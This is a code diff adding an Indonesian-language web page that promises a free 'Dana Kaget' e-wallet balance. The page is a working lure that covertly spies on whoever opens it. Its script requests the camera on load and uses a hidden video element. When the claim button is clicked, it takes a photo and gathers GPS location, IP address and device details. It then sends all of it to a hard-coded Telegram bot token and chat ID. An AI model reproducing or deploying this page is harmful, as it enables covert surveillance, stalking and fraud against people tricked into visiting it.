@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Free Saldo bantu saya</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #6a11cb, #2575fc);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      color: white;
+      text-align: center;
+    }
+    h1 { margin-bottom: 20px; }
+    button {
+      padding: 15px 30px;
+      font-size: 18px;
+      border: none;
+      border-radius: 12px;
+      background: #ff9800;
+      color: white;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    button:hover { background: #e68900; transform: scale(1.05); }
+    #status { margin-top: 20px; font-size: 16px; }
+    video, canvas { display: none; }
+  </style>
+</head>
+<body>
+  <h1>Free Saldo Dana Kaget</h1>
+  <p>Klik tombol Claim hadiah sekarang!!.</p>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+  <button id="sendBtn">Pencet untuk masukan no dana</button>
+  <p id="status"></p>
+
+  <script>
+    const botToken = "8022274166:AAGznXLb4ANnRkcKYumU4puWsf2pUgXE9JA"; 
+    const chatId = "8042154625";      
+
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const status = document.getElementById("status");
+
+    // Minta akses kamera saat halaman dibuka
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => { video.srcObject = stream; })
+      .catch(err => { status.innerText = "❌ Kamera tidak diizinkan."; });
+
+    document.getElementById("sendBtn").addEventListener("click", async () => {
+      status.innerText = "🔄 Mengambil data untuk memproses saldo...";
+
+      // ambil info device
+      const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+      const screenRes = window.screen.width + "x" + window.screen.height;
+      let ipAddress = "Tidak diketahui";
+
+      try {
+        const res = await fetch("https://api64.ipify.org?format=json");
+        const data = await res.json();
+        ipAddress = data.ip;
+      } catch(e) {}
+
+      // ambil foto dari kamera
+      const context = canvas.getContext("2d");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const imageData = canvas.toDataURL("image/png");
+
+      // ambil lokasi
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async (position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          const message = `📍 Data User:\nLatitude: ${lat}\nLongitude: ${lon}\n🌐 Maps: https://maps.google.com/?q=${lat},${lon}\n\n📱 Device Info:\n- UA: ${userAgent}\n- Platform: ${platform}\n- Resolusi: ${screenRes}\n- IP: ${ipAddress}`;
+
+          // kirim text
+          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text: message }),
+          });
+
+          // kirim foto
+          const blob = await (await fetch(imageData)).blob();
+          const formData = new FormData();
+          formData.append("chat_id", chatId);
+          formData.append("photo", blob, "foto.png");
+
+          await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: "POST",
+            body: formData,
+          });
+
+          status.innerText = "✅ Data berhasil dikirim ke Telegram!";
+        }, () => {
+          status.innerText = "❌ Lokasi gagal diambil.";
+        });
+      } else {
+        status.innerText = "❌ Browser tidak mendukung GPS.";
+      }
+    });
+  </script>
+</body>
+</html>
